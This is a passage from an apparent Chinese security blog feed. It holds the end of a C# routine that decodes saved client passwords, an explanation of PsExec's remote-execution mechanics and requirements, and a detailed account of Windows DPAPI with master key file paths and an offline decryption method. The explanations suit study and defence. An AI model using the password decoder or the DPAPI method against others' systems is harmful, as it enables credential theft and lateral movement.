<span class="keyword">if</span> (ver == <span class="number">0</span>) <span class="comment">// Version 6</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span>[] v6a = &#123; <span class="string">'~'</span>, <span class="string">'d'</span>, <span class="string">'r'</span>, <span class="string">'a'</span>, <span class="string">'G'</span>, <span class="string">'o'</span>, <span class="string">'n'</span>, <span class="string">'~'</span> &#125;;</span><br><span class="line">                a = v6a;</span><br><span class="line">                fc0 = Convert.ToInt32(<span class="string">"5A"</span>, <span class="number">16</span>); <span class="comment">//90</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="comment">// Version 7</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span>[] v7a = &#123; <span class="string">'~'</span>, <span class="string">'F'</span>, <span class="string">'@'</span>, <span class="string">'7'</span>, <span class="string">'%'</span>, <span class="string">'m'</span>, <span class="string">'$'</span>, <span class="string">'~'</span> &#125;;</span><br><span class="line">                a = v7a;</span><br><span class="line">                fc0 = Convert.ToInt32(<span class="string">"71"</span>, <span class="number">16</span>); <span class="comment">// 113</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 第二步：以字节为单位将16进制密文转成10进制</span></span><br><span class="line">            <span class="keyword">int</span> size = strHash.Length / <span class="number">2</span>; </span><br><span class="line">            <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span>[] b = <span class="keyword">new</span> <span class="keyword">int</span>[size];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                </span><br><span class="line">                b[i] = Convert.ToInt32(strHash.Substring(index, <span class="number">2</span>), <span class="number">16</span>);</span><br><span class="line">                index = index + <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 第三步：将第一个元素替换成与指定数异或后的结果</span></span><br><span class="line">            <span class="keyword">int</span>[] c = <span class="keyword">new</span> <span class="keyword">int</span>[b.Length];</span><br><span class="line"></span><br><span class="line">            c[<span class="number">0</span>] = b[<span class="number">0</span>] ^ fc0;</span><br><span class="line"></span><br><span class="line">            Array.Copy(b, <span class="number">1</span>, c, <span class="number">1</span>, b.Length - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 第四步：不断扩容拷贝自身</span></span><br><span class="line">            <span class="keyword">while</span> (b.Length &gt; a.Length)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span>[] newA = <span class="keyword">new</span> <span class="keyword">int</span>[a.Length * <span class="number">2</span>];</span><br><span class="line">                Array.Copy(a, <span class="number">0</span>, newA, <span class="number">0</span>, a.Length);</span><br><span class="line">                Array.Copy(a, <span class="number">0</span>, newA, a.Length, a.Length);</span><br><span class="line">                a = newA;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span>[] d = <span class="keyword">new</span> <span class="keyword">int</span>[b.Length];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; b.Length; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                d[i - <span class="number">1</span>] = b[i] ^ a[i - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span>[] e = <span class="keyword">new</span> <span class="keyword">int</span>[d.Length];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; d.Length - <span class="number">1</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (d[i] - c[i] &lt; <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    e[i] = d[i] + <span class="number">255</span> - c[i];</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    e[i] = d[i] - c[i];</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                decodedPW += (<span class="keyword">char</span>)e[i];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> decodedPW;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>到目前为止，此版本支持 6.5 至 7.2 版的数据恢复，但是这里只是测试了 7.2版本，效果如下</p><p><img src="/image/【编程】SharpDecryptPwd/blog_2019-10-11_17-49-10.png" alt=""></p><h2 id="来源参考"><a href="#来源参考" class="headerlink" title="来源参考"></a>来源参考</h2><p><a href="https://github.com/DoubleLabyrinth/how-does-navicat-encrypt-password" target="_blank" rel="noopener">https://github.com/DoubleLabyrinth/how-does-navicat-encrypt-password</a><br><a href="http://www.zcgonvh.com/post/SQL_Server_Management_Studio_saved_password_dumper.html" target="_blank" rel="noopener">SQL Server Management Studio密码导出工具</a><br><a href="https://github.com/zcgonvh/SSMSPwd" target="_blank" rel="noopener">https://github.com/zcgonvh/SSMSPwd</a><br><a href="https://github.com/DoubleLabyrinth/how-does-Xmanager-encrypt-password" target="_blank" rel="noopener">https://github.com/DoubleLabyrinth/how-does-Xmanager-encrypt-password</a><br><a href="https://cloud.tencent.com/developer/news/261135" target="_blank" rel="noopener">https://cloud.tencent.com/developer/news/261135</a><br><a href="https://www.t00ls.net/viewthread.php?tid=51996&amp;extra=&amp;highlight=teamview&amp;page=1" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=51996&amp;extra=&amp;highlight=teamview&amp;page=1</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是一篇对密码已保存在 Windwos 系统上的部分程序进行解析。&lt;/p&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
      <category term="编程之道" scheme="https://rcoil.me/tags/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
      <category term="Decrypt" scheme="https://rcoil.me/tags/Decrypt/"/>
    
  </entry>
  
  <entry>
    <title>【知识回顾】深入了解 PsExec</title>
    <link href="https://rcoil.me/2019/08/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3%20PsExec/"/>
    <id>https://rcoil.me/2019/08/【知识回顾】深入了解 PsExec/</id>
    <published>2019-08-18T06:37:56.000Z</published>
    <updated>2019-10-31T15:41:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>这个<strong>[ 知识回顾 ]</strong>系列文章，整合记录的是在掌握知识点中，所忽略的点、涉及的原理等；</p><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这篇文章将解释 <code>PsExec</code> 的使用条件、原理及背景知识。但不包括 <code>PsExec</code> 在通信时主要用到了 <code>SMB</code> 这个应用层协议（ <code>SMB</code>协商过程），想了解的请看 参考-1-2。</p><h2 id="0x01-什么是-PsExec"><a href="#0x01-什么是-PsExec" class="headerlink" title="0x01 什么是 PsExec"></a>0x01 什么是 <code>PsExec</code></h2><p><code>PsExec</code> 是由 <code>Mark Russinovich</code> 创建的 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" target="_blank" rel="noopener">Sysinternals Suite</a> 中包含的工具。最初，它旨在作为系统管理员的便利工具，以便他们可以通过在远程主机上运行命令来执行维护任务。<code>PsExec</code> 可以算是一个轻量级的 telnet 替代工具，它使您无需手动安装客户端软件即可执行其他系统上的进程，并且可以获得与命令控制台几乎相同的实时交互性。PsExec最强大的功能就是在远程系统和远程支持工具（如 ipconfig、whoami）中启动交互式命令提示窗口，以便显示无法通过其他方式显示的有关远程系统的信息。</p><h2 id="0x02-工作原理"><a href="#0x02-工作原理" class="headerlink" title="0x02 工作原理"></a>0x02 工作原理</h2><p>通过提供目标主机的地址，有效用户和密码，就可以远程控制计算机。</p><p><img src="/image/【知识回顾】深入了解 PsExec/Snipaste_2019-08-08_10-45-55.png" alt=""></p><p>它的背后到底发生了些什么，我们来看看：</p><ul><li>将 <code>PSEXESVC.exe</code> 上传到 <code>ADMIN$</code> （指向 <code>/admin$/system32/PSEXESVC.EXE</code>）共享文件夹内；</li><li>远程创建用于运行 <code>PSEXESVC.exe</code> 的服务；</li><li>远程启动服务。</li></ul><p><code>PSEXESVC</code> 服务充当一个重定向器（包装器）。它在远程系统上运行指定的可执行文件（事例中的是 <code>cmd.exe</code>）。同时，它通过主机之间来重定向进程的输入/输出（利用命名管道）。</p><p><img src="/image/【知识回顾】深入了解 PsExec/blog_2019-08-09_09-39-29.png" alt=""></p><h2 id="0x03-详细过程"><a href="#0x03-详细过程" class="headerlink" title="0x03 详细过程"></a>0x03 详细过程</h2><ul><li>使用提供的凭证，通过 <code>SMB 会话</code> 进行身份验证。</li><li>通过 <code>SMB</code> 访问默认共享文件夹 <code>ADMIN$</code>，并上载 <code>PSEXESVC.exe</code>；</li><li><p><img src="/image/【知识回顾】深入了解 PsExec/Snipaste_2019-08-08_15-14-16.png" alt=""></p></li><li><p>打开 <code>\\RDC\pipe\svcctl</code> 的句柄，与<code>服务控制管理器（SCM）</code>进行通信，这使得我们能够远程创建/启动服务。此时使用的是 <code>SVCCTL</code> 服务，通过对 <code>SVCCTL服务</code> 的 <code>DCE/RPC</code> 调用来启动 <code>PsExec</code>;</p></li><li>使用上传的 <code>PSEXESVC.exe</code> 作为服务二进制文件，调用 <code>CreateService 函数</code>；</li><li>调用 <code>StartServices 函数</code>；</li><li><img src="/image/【知识回顾】深入了解 PsExec/Snipaste_2019-08-08_15-25-29.png" alt=""></li><li><p><img src="/image/【知识回顾】深入了解 PsExec/Snipaste_2019-08-08_15-28-25.png" alt=""></p></li><li><p>正如下面的 <code>Wireshark</code> 所捕获到的数据，它是创建了命名管道来重定向 stdin（输入）、stdout（输出）、stderr（输出）。</p></li><li><img src="/image/【知识回顾】深入了解 PsExec/Snipaste_2019-08-08_15-33-49.png" alt=""></li></ul><p>总共创建了4个命名管道，一个用于服务本身，另外的管道用于重定向进程的 stdin、stdout、stderr。</p><p><img src="/image/【知识回顾】深入了解 PsExec/Snipaste_2019-08-08_15-47-34.png" alt=""></p><h2 id="0x04-使用-PsExec-的最低要求"><a href="#0x04-使用-PsExec-的最低要求" class="headerlink" title="0x04 使用 PsExec 的最低要求"></a>0x04 使用 PsExec 的最低要求</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、远程机器的 <span class="number">139</span> 或 <span class="number">445</span> 端口需要开启状态，即 SMB；</span><br><span class="line"><span class="number">2</span>、明文密码或者 NTLM 哈希；</span><br><span class="line"><span class="number">3</span>、具备将文件写入共享文件夹的权限；</span><br><span class="line"><span class="number">4</span>、能够在远程机器上创建服务：SC_MANAGER_CREATE_SERVICE (访问掩码：<span class="number">0x0002</span>)；</span><br><span class="line"><span class="number">5</span>、能够启动所创建的服务：SERVICE_QUERY_STATUS（访问掩码：<span class="number">0x0004</span>）+ SERVICE_START（访问掩码：<span class="number">0x0010</span>）</span><br></pre></td></tr></table></figure><p><strong>注意</strong></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">NTLM != NTLM v1/v2 ；</span><br><span class="line">NTFS 权限 != 共享权限；</span><br><span class="line">如果使用的是 Sysinternal 的 PsExec，它是会将 PSEXESVC.exe 复制到 ADMIN$，因此是具备访问它的权限；</span><br><span class="line">PSEXESVC 服务将会安装在远程系统中，此时将会生成 Event <span class="number">4697</span>、<span class="number">7045</span> 这<span class="number">2</span>种事件日志；</span><br><span class="line">PsExec <span class="number">2.1</span>版本之后，不再是明文传输。</span><br></pre></td></tr></table></figure><p>在多数情况下，即使账号出现泄漏情况，使用 <code>PsExec</code>， 也无法完成第4和第5点的要求，因为账号不是特权账号（RID500、域管理员）。</p><h2 id="0x05-其他"><a href="#0x05-其他" class="headerlink" title="0x05 其他"></a>0x05 其他</h2><p>日志分析：略</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p>1、<a href="https://bbs.pediy.com/thread-223721.htm" target="_blank" rel="noopener">[翻译] 网络安全分析之 SMB 协议</a></p><p>2、<a href="http://zone.secbug.net/content/2230.html" target="_blank" rel="noopener">[使用Hash直接登录Windows]简单分析</a></p><p>3、<a href="https://www.anquanke.com/post/id/84921" target="_blank" rel="noopener">[技术分享] 深入分析PsExec执行行为</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个&lt;strong&gt;[ 知识回顾 ]&lt;/strong&gt;系列文章，整合记录的是在掌握知识点中，所忽略的点、涉及的原理等；&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="系统安全" scheme="https://rcoil.me/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
      <category term="知识回顾" scheme="https://rcoil.me/tags/%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE/"/>
    
  </entry>
  
  <entry>
    <title>【知识回顾】DPAPI 详解</title>
    <link href="https://rcoil.me/2019/07/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91DPAPI%20%E8%AF%A6%E8%A7%A3/"/>
    <id>https://rcoil.me/2019/07/【知识回顾】DPAPI 详解/</id>
    <published>2019-07-06T13:29:11.000Z</published>
    <updated>2019-10-31T15:42:32.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>摘要：</strong>数据保护接口是微软从 Windows 2000 开始引入的一种简易程序接口，主要为应用程序和操作系统程序提供高强度的数据加密和解密服务。Windows 系统用户大量的私密数据都采用了 DPAPI 进行加密存储。</p><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>​        绝大多数应用程序都有数据加密保护的需求，存储和保护私密信息最安全的方式就是每次需要加密或解密时都从用户那里得到密码，使用后再丢弃。这种方式每次处理信息时都需要用户输入口令，对于绝大多数用户来说，这种方式是不可取的。因为这要求用户记住很多信息，而用户一般会反复使用同一个密码，从而降低系统的安全性和可用性。因此需要一种加密机制，再不需要用户输入任何信息的情况下也能存储秘密数据，而微软数据保护接口（<code>Data Protection Application Programming Interface</code>，DPAPI）便是瞒住这种要求的程序接口。</p><p>​        从 Windows 2000 开始，用户程序或操作系统程序就可以直接调用 DPAPI 来加密数据。由于 DPAPI 简单易用且加密强大，大量应用程序都采用 DPAPI 加密用户的私密数据，如 <code>Chrome 浏览器</code>的自动登陆密码、<code>远程桌面</code>的自动登陆密码、<code>Outlook邮箱</code>的账号密码、<code>加密文件系统</code>的私钥等。DPAPI 内部加密流程异常复杂而且微软官方也未公布过其内部细节，这给理解该接口内部实现机制带来了极大困难。本文在已有的研究基础上对 DPAPI加密机制做了全面剖析，给出了DPAPI的离线解密方法。</p><h2 id="0x01-DPAPI-概述"><a href="#0x01-DPAPI-概述" class="headerlink" title="0x01 DPAPI 概述"></a>0x01 DPAPI 概述</h2><h3 id="1-1-DPAPI-函数"><a href="#1-1-DPAPI-函数" class="headerlink" title="1.1 DPAPI 函数"></a>1.1 DPAPI 函数</h3><p>​        DPAPI 由一个加密函数（<code>CryptProtectData()</code>）和一个解密函数（<code>CryptUnProtectData()</code>）组成，是一组跟Windows 系统用户环境上下文密切相关的数据保护接口。某个系统用户调用 <code>CryptProtectData()</code> 加密后的数据只能由同一系统用户调用 <code>CryptUnProtectData()</code> 来解密，一个系统用户无法调用 <code>CryptUnProtectData()</code> 来解密其他系统用户的 <code>DPAPI</code> 加密数据。</p><ul><li><p><code>CryptProtectData()</code> 的函数调用</p><p>  <img src="/image/【知识回顾】DPAPI 详解/CryptProtectData.png" alt=""></p>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">pDataIn：DATA_BLOB</span> <span class="string">结构指针，只想需要加密的数据明文块；</span></span><br><span class="line"><span class="string">szDataDescr：描述字符串，返回的数据包含该字符串，其未被加密。该参数为可选参数，可以为</span> <span class="literal">NULL</span><span class="string">；</span></span><br><span class="line"><span class="string">pOptionslEntropy：DATA_BLOB</span> <span class="string">结构指针，指向一个额外熵参数，可以是一个加密密码。改参数为可选参数乜可以为</span> <span class="literal">NULL</span><span class="string">。若加密时设置了额外熵参数，则加密时必须提供同样的熵参数，否则无法解密；</span></span><br><span class="line"><span class="string">pvReserved：保留，必须为</span> <span class="literal">NULL</span><span class="string">；</span></span><br><span class="line"><span class="string">pPromptStruct：CRYPTPROTECTPROMPTSTRUCT</span> <span class="string">结构指针，用于弹出对话框与用户交互，通常为</span> <span class="literal">NULL</span><span class="string">。</span></span><br><span class="line"><span class="string">dwFlags：加密标识位，通常为</span> <span class="literal">NULL</span><span class="string">；</span></span><br><span class="line"><span class="string">pDataOut：DATA_BLOB</span> <span class="string">结构指针，只想经过加密处理后的密文块。</span></span><br></pre></td></tr></table></figure></li><li><p><code>CryptUnProtectData()</code> 的参数跟 <code>CryptProtectData()</code> 的参数类似，详见 <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa380882(v=vs.85" target="_blank" rel="noopener">MSDN 文档</a>.aspx)，这里不在说明。</p></li></ul><h3 id="1-2-基本概念介绍"><a href="#1-2-基本概念介绍" class="headerlink" title="1.2 基本概念介绍"></a>1.2 基本概念介绍</h3><p><strong>1）加密应用程序编程接口</strong></p><p>​        加密应用程序编程接口（ cryptography application programming interface, CryptoAPI ）是 Windows 平台提供的一组函数，该函数允许应用程序对用户的秘密信息进行编码、加密和数字签证等操作。<code>CryptoAPI</code> 内部的加密操作是在加密服务提供程序（CSP）的独立模块中执行，<strong>DPAPI 是在 CryptoAPI 的基础上实现封装</strong>。</p><p><strong>2）加密服务提供程序</strong></p><p>​        加密服务提供程序（ cryptographic service provider，CSP ）是一组实现标准加密和签名算法的硬件和软件的组合。每个 CSP 都包含一组它们自己定义并实现的函数。不同的 CSP 提供的安全算法不用，且 CSP 是平台相关的。不同的 Windows 操作系统提供的 CSP 的个数和类型也不同，每个 CSP 都有其对应的名称和类型，名称必须是唯一的。目前常用的 CSP 类型有9种，要指定采用哪种 CSP，只需在 <a href="https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptacquirecontexta" target="_blank" rel="noopener">CryptAcquirecContext()</a> 中指定即可，DPAPI 默认使用 <code>PROV_RSA_FULL</code> 类型。</p><p><strong>3）算法标识</strong></p><p>​        算法标识（ ALG_ID ）是微软顶一顶一系列 32 位整型值，用于指明 <code>CryptoAPI</code> 所采用的加密或散列算法类型。其中以 <code>0x66</code> 开头的标识通常表示对称加密算法，以 <code>0x88</code> 开头的标识通常表示散列算法。例如，<code>CALG_3DES</code> 对应的值为 <code>0x6603</code> ，表示为三重数据加密标准。</p><p><strong>4）安全散列算法</strong></p><p>​        安全散列算法（ secure hash algorithm，SHA ）是散列算法中的一种，又叫摘要算法，用于产生消息摘要，也是经常使用的一种算法。在数据签名标准（ digita signature standard，DSS ）中，安全散列算法通常和数字签名算法（ digital signature algorithm，DSA ）一起用于对消息进行数字签名。每一个安全散列算法都有其对应的算法标识。在 <code>CryptoAPI</code> 中，SHA 对应的算法标识为 <code>CALG_SHA</code> 。目前，安全散列算法有 4 种：SHA-1、SHA-256、SHA-384 和 SHA-512，可分别产生 160 位、256 位、384 位和 512 位长的消息摘要，还有一个变种的SHA-224（224位）实现方为 Bouncy Castle。</p><p><strong>5）会话密钥</strong></p><p>​        会话密钥（ session key ）是随机产生的密钥，使用一次后，立刻被丢弃而不会被保存。在 <code>CryptoAPI</code> 中，会话密钥通常是对称加密算法的密钥。会话密钥由 40～2000 位随机数组成，可以通过调用 CryptoAPI 中的 <a href="https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptderivekey" target="_blank" rel="noopener">CryptDeriveKey()</a> 并传递一个散列值来生成。</p><p><strong>6）干扰值</strong></p><p>​        干扰值（ salt valve ）也称作 “盐”，通常是随机数，一般可看作是会话密钥的一部分。干扰值被添加到会话密钥后，通常是以明文的形式被防止在加密数据的前端。加入干扰值可以有效地防止堆成加密算法被预先计算好的彩虹表攻击。在 <code>CryptoAPI</code> 中，干扰值通过 <a href="https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptgenrandom" target="_blank" rel="noopener">CryptGenRandom()</a> 来生成，此函数在将来的版本会进行删除，详情请看函数详情。</p><p><strong>7）基于口令的密钥派生函数</strong></p><p>​        基于口令的密钥派生函数（ passwordbased key derivation function，PBKDF ）通过对干扰后的用户输入口令计算多次散列来缓和字典攻击。攻击者若想确定口令的正确性，需要执行上百万条指令，导致完成一次字典攻击就需要花费大量时间。PBKDF 目前有两个版本：PBKDF1 和 PBKDF2，两个函数均以口令、干扰值和内部函数的跌代次数作为输入。在 DPAPI 中，采用的是 PBKDF2 版本，且内部做了部分改动。</p><p><strong>8）加密散列函数</strong></p><p>​        加密散列函数又叫基于散列的消息认证代码（ hash-based message authentication code，HMAC ）。使用加密散列函数需要一个密钥，同时还需要制定一个散列函数，可以是 MD5 或 SHA-1 等。在 DPAPI 中，HMAC 主要用于数据认证。</p><p><strong>9）密钥分组链接</strong></p><p>​        密钥分组链接（ cipher-block chaining，CBC ）是一种加密模式，在 CBC 模式中，每个分组完的明文块都需要与前一个经过加密后的密文块进行异或操作，然后进行加密操作。因此需要使用初始化向量。 CBC 加密模块是微软默认使用的加密模块，DPAPI 内部对所有对称加密算法默认都采用 CBC 加密模式。</p><p><strong>10）填充</strong></p><p>​        填充( padding) 是明文根据加密函数进行数据分组后，<em>由于最后一个明文块不满足分组数据长度要求而在末尾额外添加的数据</em>。填充的数据解密后一般会被自动移除，DPAPI 内部所有堆成加密算法默认都采用 <code>PKCS</code> 填充方式。</p><h2 id="0x02-DPAPI-加密机制分析"><a href="#0x02-DPAPI-加密机制分析" class="headerlink" title="0x02 DPAPI 加密机制分析"></a>0x02 DPAPI 加密机制分析</h2><p>​        <code>CryptProtectData()</code> 是对 <code>CryptoAPI</code> 的封装，其加密过程如下图所示。</p><p><img src="/image/【知识回顾】DPAPI 详解/DPAPI 加密过程.png" alt=""></p><p><center>图1 DPAPI 加密过程</center><br>​        整个加密过程大致可以分成 3 个阶段，分别为<strong>生成主密钥</strong>、<strong>解密主密钥</strong>以及<strong>使用主密钥加密数据</strong>。</p><h3 id="2-1-生成主密钥"><a href="#2-1-生成主密钥" class="headerlink" title="2.1 生成主密钥"></a>2.1 生成主密钥</h3><p>​        当前应用程序调用 <code>CryptProtectData()</code> 时，DPAPI 会读取主密钥存储区下的 <code>Preferred</code> 文件，获取当前系统使用的主密钥文件及其创建时间，如果创建时间与当前系统时间相差超过了 90 天，则重新生成一个主密钥文件。</p><p>​        为了防止攻击者对同一个加密主密钥进行长期的攻击，微软引入了主密钥的更新机制，更新时间微软设置为 90 天。即若 <code>Preferred</code> 文件中指示的主密钥创建时间与系统当前时间<strong>相差 90 天</strong>以上，将生成一个新的主密钥，新的主密钥将以同样的加密方式保护用户数据。这种主密钥更新策略有效防止了攻击者破解唯一的主密钥后即可访问用户所有的受保护数据。因为主密钥会更新，因而 DPAPI 必须提供一种机制能够解密历史主密钥加密下的数据库。其实，DPAPI 不删除任何过期的主密钥，所有的主密钥文件保存在用户的配置文件目录下，且全受到用户登陆密码的保护，并且每一个加密块都存储着当时加密它的主密钥全局唯一标识符（GUID）。当需要解密加密块时，DPAPI 从加密块中提取 GUID，找到对应主密钥文件进行相应的数据解密。</p><h3 id="2-2-解密主密钥"><a href="#2-2-解密主密钥" class="headerlink" title="2.2 解密主密钥"></a>2.2 解密主密钥</h3><p>​        若 <code>Preferred</code> 文件指示的主密钥没有过期，DPAPI 将解密对应的主密钥文件，获取 64 字节的主密钥。</p><p>​        主密钥受到用户登陆密码保护。DPAPI 首先使用 SHA-1 安全散列函数作用于用户登陆密码，然后将此密码散列和 16 字节的干扰值以跌代次数提供给基于口令的密钥派生函数 PBKDF2，用户派生一个会话密钥；然后用此会话密钥作为堆成加密算法的加密密钥，对主密钥进行加密，将加密后的主密钥存储在用户的配置文件目录下。</p><p>​        为了防止主密钥被篡改，主密钥将被计算 HMAC 加密散列。DPAPI 将使用 SHA 版HMAC 加密散列算法并以密码散列作为加密密钥作用于 16 字节干扰值，进而派生对应加密 散列值。该加密散列值再次作为 HMAC 的密钥计算主密钥的加密散列，计算后的加密散列同加密后的主密钥一起存于主密钥中。</p><p>​        由于主密钥受到用户登陆密码的保护，而用户登陆密码又是可修改的。因此，DPAPI 必须提供一种机制，使得在用户修改登陆密码后仍然可以正常解密主密钥。其实，DPAPI 对密码修改模块进行了 Hook 操作。当用户修改密码时，所有主密钥都将根据新的密码重新加密。另外，用户配置文件目录下有个历史凭据文件 <code>CREDHIST</code>，当用户修改密码时，旧密码的 SHA-1 散列值会用新的密码进行加密，然后将加密后的结果存放在文件的底部。因此，如果当前系统登录密码法务解密主密钥，DPAPI 将使用当前密码解密历史凭据文件，获取上一次历史密码散列值，然后用这个历史密码散列值解密主密钥。如果解密又失败了，历史密码散列值将再次用于解密历史凭据文件，获取更旧的密码散列值。如此下去，直到成功解密主密钥为止。</p><h3 id="2-3-使用主密钥加密数据"><a href="#2-3-使用主密钥加密数据" class="headerlink" title="2.3 使用主密钥加密数据"></a>2.3 使用主密钥加密数据</h3><p>​        主密钥并不直接作为加密密钥来保护数据。DPAPI 首先将主密钥、16 字节干扰值以及应用程序提供的额外熵参数 3者组合派生一个会话密钥，然后用这个会话密钥对数据进行加密。但这个会话密钥永远不会被保存，DPAPI 选择存储用于派生会话密钥的 16 字节干扰值。这些干扰值是用来产生加密数据的关键。当 DPAPI 需要解密加密块时，便从加密块种提取这 16 字节的干扰值，并以同加密相同的方式派生出会话密钥，然后用该会话密钥对数据进行解密。</p><h2 id="0x03-DPAPI-离线解密方法"><a href="#0x03-DPAPI-离线解密方法" class="headerlink" title="0x03 DPAPI 离线解密方法"></a>0x03 DPAPI 离线解密方法</h2><p>由以上对 DPAPI 加密过程的分析容易得出 DPAPI 离线解密过程，如下图所示。</p><p><img src="/image/【知识回顾】DPAPI 详解/DPAPI 离线解密过程.png" alt=""></p><p><center>图2 DPAPI 离线解密过程</center><br>​        DPAPI 离线解密过程大致可以分为以下几点。</p><h3 id="3-1-定位主密钥"><a href="#3-1-定位主密钥" class="headerlink" title="3.1 定位主密钥"></a>3.1 定位主密钥</h3><p>​        由对 DPAPI 加密过程的分析可知主密钥文件会定期更新，Preferred 文件中存储这最后生成的主密钥文件 GUID，然而任意给定的一个 DPAPI 加密块并不一定时用最新的主密钥进行解密。为了快速定位 DPAPI加密块对应的主密钥文件，DPAPI 加密块种存储当时加密它的主密钥 GUID。DPAPI 加密块大致结构如下图所示。</p><p><img src="/image/【知识回顾】DPAPI 详解/定位主密钥.png" alt=""></p><p><center>图3 DPAPI 加密块结构</center><br>​        从 DPAPI 加密块结构可知其除了存储主密钥 GUID 外，还存储解密时所需的其他关键数据信息，包括所使用的对称加密算法标识、安全散列算法标识、干扰值等。</p><ul><li>第一个字段表示版本号，为固定值 0x00000001；</li><li><p>第二个字段表示加密服务提供程序的 DUID，也为固定值 D08C9DDF0115D1118C7A00C04FC297EB；</p><p>​    由于标准的 DPAPI 加密块总是以单个完整的文件存在，所以标准的 DPAPI 加密块有可能包含在文件中作为文件的一部分存在，甚至有些文件可以包含多个标准的 DPAPI 加密块。由于 DPAPI 加密块的前两个字段总是为固定值，因此可以以此为特征在文件中搜索和提取标准的 DPAPI 加密块。</p></li></ul><h3 id="3-2-解密主密钥"><a href="#3-2-解密主密钥" class="headerlink" title="3.2 解密主密钥"></a>3.2 解密主密钥</h3><p>​        Windows 的主密钥文件和历史凭据文件有其固定的路径结构，如下所示。</p><ul><li>用户主密钥文件，位于<code>％APPDATA％\Microsoft\Protect\％SID％</code></li><li><p>系统主密钥文件，位于<code>％WINDIR％\System32\Microsoft\Protect\S-1-5-18\User</code></p><p>​    每个系统帐号都有其对应的若干个主密钥；%SID% 是 Windows系统为区分不同账户而为它们分配的全局唯一标识符，它们的格式的固定的。和主密钥对应的历史凭据文件则位于主密钥的上一层目录。</p><p>​    主密钥文件共包含 5 个数据单元，分别为<code>主密钥头部单元</code>、<code>用户主密钥单元</code>、<code>本地加密密钥单元</code>、<code>历史凭据标识单元</code>和<code>域密钥备份单元</code>。结构如图所示。</p></li></ul><p><img src="/image/【知识回顾】DPAPI 详解/主密钥文件结构.png" alt=""></p><p><center>图4 主密钥文件结构</center><br>​        其中，主密钥头部单元包括主密钥 GUID，该标识与 DPAPI 中指示的加密密钥唯一标识相对应。另外，主密钥头部单元还包含了指示其他个单元占用字节数的字段。历史凭据单元也包含一个全局唯一表示符（ CREDHIST GUID 